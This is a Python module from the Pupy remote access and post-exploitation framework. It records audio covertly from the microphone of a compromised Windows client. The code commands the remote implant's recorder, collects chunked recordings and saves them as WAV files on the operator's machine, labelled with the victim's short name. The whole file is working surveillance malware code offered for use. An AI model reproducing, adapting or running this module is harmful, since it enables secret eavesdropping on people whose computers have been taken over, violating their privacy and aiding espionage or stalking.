# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from pupylib.PupyErrors import PupyModuleError
from pupylib.PupyModule import (
    config, PupyModule, PupyArgumentParser
)

import datetime
import os.path
import subprocess
import wave


__class_name__="RecordMicrophoneModule"


def save_wav(path, sample_width, channels, rate, raw_frames):
    waveFile = wave.open(path, 'wb')
    waveFile.setnchannels(channels)
    waveFile.setsampwidth(sample_width)
    waveFile.setframerate(rate)
    waveFile.writeframes(raw_frames)
    waveFile.close()


@config(cat="gather", compat=["windows"])
class RecordMicrophoneModule(PupyModule):
    """ record sound with the microphone ! """

    dependencies=["pyaudio", "mic_recorder"]

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='record_mic', description=cls.__doc__)
        cls.arg_parser.add_argument('-t', '--time', default=5, help='number of 5 seconds recordings to save')
        cls.arg_parser.add_argument('-m', '--max-length', default=None, help='split recorded files into multiple files if the recording goes over --max-length seconds')
        cls.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open the default sound player for preview')

    def run(self, args):
        try:
            os.makedirs(os.path.join("data", "audio_records"))
        except Exception:
            pass

        self.success("starting recording for %ss ..." % args.time)

        max_length = args.max_length
        if max_length is None:
            max_length = args.time
        if int(max_length) > int(args.time):
            raise PupyModuleError("--max-length argument cannot be bigger than --time")

        for sw, c, r, rf in self.client.conn.modules['mic_recorder'].record_iter(total=args.time, chunk=max_length):
            filepath = os.path.join("data","audio_records","mic_" + self.client.short_name() + "_" + str(datetime.datetime.now()).replace(" ","_").replace(":","-") + ".wav")
            save_wav(filepath, sw, c, r, rf)
            self.success("microphone recording saved to %s" % filepath)

        if args.view:
            viewer = self.client.pupsrv.config.get("default_viewers", "sound_player")

            found = False
            for p in os.environ.get('PATH', '').split(':'):
                if os.path.exists(os.path.join(p, viewer)):
                    subprocess.Popen([viewer, filepath])
                    found = True
                    break

            if not found:
                self.error('Default viewer not found: %s' % viewer)
